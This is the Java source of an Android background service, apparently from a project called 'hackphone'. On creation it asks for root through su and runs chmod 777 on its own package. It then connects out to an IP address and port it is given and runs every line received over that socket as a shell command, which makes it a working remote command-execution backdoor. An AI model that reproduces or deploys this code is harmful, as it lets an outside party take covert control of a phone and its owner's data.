package com.chidacan.hackphone;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;

import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.IBinder;
import android.util.Log;

public class ServMain extends Service  {
	private static final String TAG = "ServMain" ;
	private String mip;
	private int mport= 0;
	public static final String ACTION = "com.chidacan.hackphone.ServMain";
	private MyThread threadSocket;

	@Override
	public IBinder onBind(Intent intent) {
		Log.v(TAG, "ServiceDemo onBind");
		return null;
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.v(TAG, "ServiceDemo onStartCommand");
		mip = intent.getStringExtra("ip");
		mport = intent.getIntExtra("port", 0);
		return super.onStartCommand(intent, flags, startId);
	}
	 
    class MyThread extends Thread {
        @Override
        public void run() {
        	boolean run = true; String readed;	String msg; StringBuilder sb = new StringBuilder();
        	long lastcmdt = 0,nowcmdt = 0,spant = 0;
            try {
            	Log.v(TAG, "ServiceDemo Thread Run");
            	do{
	            	Socket s = null;
	            	if(mport == 0 || mip == null){sleep(1000);continue;};
            		try{
            			Log.v(TAG, "ServiceDemo Socket connecting");
            			Log.v(TAG,mip);
		            	s = new Socket(mip,mport);
		            	OutputStream ou = s.getOutputStream(); 
		            	BufferedReader bff = new BufferedReader(new InputStreamReader( s.getInputStream()));
		            	do{
		            		try{
		            			readed = bff.readLine();
		            		}
		            		catch(Exception e){
		            			break;
		            		}
		            		Log.v(TAG,"read");
		            		if(readed == null) break;
		            		//sb.append("input keyevent ");
		            		//sb.append(Integer.toString((char)readed));
		            		Log.v(TAG,readed);
		            		try{
		            			nowcmdt = System.nanoTime();
		            			spant = (nowcmdt - lastcmdt) / 1000000;
		            			if((nowcmdt - lastcmdt) < 100){sleep(100 - spant);}
			            		Process p = Runtime.getRuntime().exec(readed);
			            		BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
			            		String line = null;  
			            		while ((line = in.readLine()) != null) { 
			            			Log.v(TAG, line);
			            		}
			            		lastcmdt = nowcmdt;
		            		}catch(Exception e){
		            			e.printStackTrace();
		            		}
		            		
		            		sb.delete(0, sb.length());
		            		
		            	}while(true);
            		}catch(Exception e){
            			e.printStackTrace();
            		}
            		if(s != null) s.close();
            	}while(run);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }	
	
	@Override
	public void onCreate() {
		Log.v(TAG, "ServiceDemo onCreate");
		upgradeRootPermission(getPackageCodePath()); 
		Log.v(TAG, "ServiceDemo root ok");
		threadSocket = new MyThread();
		threadSocket.start();
		
		super.onCreate();
	}
	
	@Override
    public void onDestroy() {
		Log.v(TAG, "ServiceDemo onDestroy");
		super.onDestroy();		
    }
	
	/**
	 * 应用程序运行命令获取 Root权限，设备必须已破解(获得ROOT权限)
	 * 
	 * @return 应用程序是/否获取Root权限
	 */
	public static boolean upgradeRootPermission(String pkgCodePath) {
	    Process process = null;
	    DataOutputStream os = null;
	    try {
	        String cmd="chmod 777 " + pkgCodePath;
	        process = Runtime.getRuntime().exec("su"); //切换到root帐号
	        os = new DataOutputStream(process.getOutputStream());
	        os.writeBytes(cmd + "\n");
	        os.writeBytes("exit\n");
	        os.flush();
	        process.waitFor();
	    } catch (Exception e) {
	        return false;
	    } finally {
	        try {
	            if (os != null) {
	                os.close();
	            }
	            process.destroy();
	        } catch (Exception e) {
	        }
	    }
	    return true;
	}	
	
}
